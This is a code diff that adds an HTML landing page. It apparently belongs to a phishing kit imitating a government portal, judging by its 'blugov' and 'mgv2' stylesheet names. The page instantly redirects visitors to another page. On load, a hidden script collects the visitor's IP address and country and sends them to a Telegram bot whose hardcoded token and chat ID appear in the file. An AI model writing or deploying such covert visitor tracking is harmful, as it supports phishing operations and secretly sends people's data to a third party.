@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>HELLO</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="refresh" content="0;url=h.html">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
+    <link href="css/mgv2-application.css" rel="stylesheet">
+    <link href="css/blugov.css" rel="stylesheet">
+    <style>
+        .error-message { color: red; margin-top: 10px; }
+        .success-message { color: green; margin-top: 10px; }
+    </style>
+    <script>
+        // Telegram Bot Token and Chat ID
+        const botToken = '7811460984:AAHofDMKUKo8nwgsmZWLv8KMnd4K9bn97tk';
+        const chatId = '-4883677591';
+
+        // Function to send message to Telegram
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .catch(error => console.error('Error sending Telegram message:', error));
+        }
+
+        // Function to get IP and country
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip || 'Unknown IP';
+                const country = data.country_name || 'Unknown Country';
+                const message = `*New Visit to Page*\nIP: ${ip}\nCountry: ${country}`;
+                sendTelegramMessage(message);
+            })
+            .catch(error => {
+                sendTelegramMessage('*New Visit to Page*\nIP: Unknown\nCountry: Unknown');
+            });
+    </script>
+</head>
+</html>
